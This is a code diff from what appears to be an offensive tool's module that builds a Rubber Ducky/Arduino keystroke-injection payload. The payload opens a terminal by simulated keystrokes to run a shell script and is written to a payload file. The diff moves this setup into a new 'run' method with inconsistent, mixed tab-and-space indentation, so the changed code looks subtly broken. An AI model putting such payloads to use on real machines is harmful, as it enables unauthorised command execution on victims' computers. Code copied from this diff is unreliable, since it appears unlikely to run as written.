@@ -7,12 +7,13 @@ class payload:
 		self.description = "Arduino payload that replicates keystrokes for shell script execution."
 		self.usage = "Install via https://"
 		
-		if os.path.exists("payloads") == False:
-			os.mkdir("payloads")
-		if os.path.exists("payloads/rubber_duck") == False:
-			os.mkdir("payloads/rubber_duck")
-		payload_save_path = "payloads/rubber_duck/payload.txt"
-		payload = """\
+		def run(self,server):
+			if os.path.exists("payloads") == False:
+			        os.mkdir("payloads")
+		        if os.path.exists("payloads/rubber_duck") == False:
+			        os.mkdir("payloads/rubber_duck")
+		        payload_save_path = "payloads/rubber_duck/payload.txt"
+		        payload = """\
     DELAY 10
     CTRL ALT T
     DELAY 10
@@ -25,3 +26,6 @@ class payload:
 		f.write(payload)
 		f.close()
 		h.info_general("Payload saved to " + payload_save_path)
+
+		
+		
